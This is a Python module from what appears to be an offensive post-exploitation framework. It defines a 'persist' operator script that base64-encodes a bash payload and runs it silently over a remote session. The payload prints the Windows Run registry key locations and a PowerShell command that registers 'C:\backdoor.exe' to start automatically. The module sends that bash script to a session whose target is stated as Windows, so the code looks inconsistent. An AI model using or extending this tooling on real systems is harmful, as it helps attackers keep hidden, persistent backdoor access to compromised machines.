"""Windows registry run keys persistence."""

from ..base import OperatorScript, ScriptResult


class RegistryRunKeys(OperatorScript):
    """Windows registry run keys for persistence."""
    
    name = "Registry Run Keys"
    description = "Windows registry run keys persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] REGISTRY RUN KEYS (Windows)"
echo "=============================="
echo ""
echo "[!] This script targets Windows systems"
echo ""
echo "[+] Common registry run key locations:"
echo "  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
echo "  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
echo "  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
echo ""
echo "[+] PowerShell command to add persistence:"
echo '  New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\backdoor.exe"'
echo ""
echo "[+] Check existing run keys:"
echo '  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"'
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Registry run keys info...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Registry run keys info executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
